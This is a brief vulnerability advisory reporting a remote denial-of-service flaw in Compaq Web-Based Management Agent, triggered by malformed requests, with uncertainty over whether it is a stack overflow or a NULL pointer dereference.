Compaq Web-Based Management Agent has been reported prone to a remote denial of service vulnerability. The problem occurs when making malformed requests to the service. The resulting error reports a stack overflow, however it has not been confirmed whether this issue is exploitable to corrupt memory. The problem may in fact be the result of a NULL pointer dereference.
